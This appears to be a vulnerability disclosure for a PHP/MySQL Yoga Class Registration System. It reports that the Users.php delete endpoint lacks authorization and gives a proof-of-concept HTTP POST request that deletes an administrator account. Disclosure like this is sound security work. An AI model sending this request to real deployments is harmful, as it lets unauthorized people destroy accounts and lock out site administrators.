## Yoga Class Registration System has Delete any user


## supplier
https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html

## Vulnerability file
/php-ycrs/classes/Users.php?f=delete


## describe
There is a vulnerability in the yoga registration system that allows unlimited deletion of users. An attacker could exploit this vulnerability to directly remove an administrator from the system without authorization.

POC
```
POST /php-ycrs/classes/Users.php?f=delete HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 4
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ycrs/admin/?page=user/list
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=8
```

Administrators are removed without authorization.
<img width="1445" alt="image" src="https://github.com/user-attachments/assets/aabc67ec-7a8f-4e09-a738-0c34e4620243">
<img width="1204" alt="image" src="https://github.com/user-attachments/assets/ea00e8b2-61d5-4ee3-bc41-3def55e36f29">
<img width="1435" alt="image" src="https://github.com/user-attachments/assets/03caa3e8-8a65-4d07-ad92-addabe25c90b">








